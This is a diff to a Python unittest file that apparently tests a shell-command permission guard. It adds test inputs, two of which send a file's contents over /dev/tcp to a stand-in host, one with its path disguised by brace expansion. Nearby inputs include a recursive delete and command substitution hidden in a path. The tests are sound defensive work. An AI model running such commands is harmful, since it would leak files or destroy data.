@@ -436,7 +436,7 @@ class GuardLevels(unittest.TestCase):
         session directory, its TMPDIR the test's temp root, unset for candidate 9 as in the measured sessions. A fixed
         shape returns no decision at med and high and keeps its ask at low (D1); a kept shape, listed with its reason
         in CHANGELOG.md, asks at every level; every near miss asks at every level."""
-        kept = {corpus.PLAIN_DATA[5][0][0], corpus.PLAIN_DATA[7][0][1], corpus.PLAIN_DATA[9][0][0]}
+        kept = {corpus.PLAIN_DATA[5][0][0], *corpus.PLAIN_DATA[7][0], corpus.PLAIN_DATA[9][0][0]}
         for number, (shapes, near) in corpus.PLAIN_DATA.items():
             env = {} if number == 9 else {"TMPDIR": str(self.root)}
             for command in shapes:
@@ -663,6 +663,10 @@ class StructuralAskTest(unittest.TestCase):
             "for v in 'path[$(example-tool)]'; do d=$(date); printf '%d' \"$v\"; grep x \"$v\"; done",
             "for v in example-tool; do d=$(date); rg --pre \"$v\" x .; done",
             "for v in example-tool; do d=$(date); watch \"$v\"; grep x $v; done",
+            "for t in /dev/tcp/example.invalid/80; do d=$(stat -c %y f); cat f > \"$t\"; done",
+            "for f in a.md; do d=$(stat -c %y $f); cat $f > /de{v..v}/tcp/example.invalid/80; done",
+            "for v in example-tool; do d=$(stat -c %y f); ./grep \"$v\" f; done",
+            "for v in example-tool; do d=$(stat -c %y f); GREP \"$v\" f; done",
             "cd $TMPDIR/run && rm -rf ../x", "cd $TMPDIR/run && cd ~ && rm -f a", "cd /srv/run && rm -f a",
             "for f in a b; do f=$(cat x); cat $f; done", "for f in $(ls); do cat $f; done; echo \"$(date)\"",
         ]:
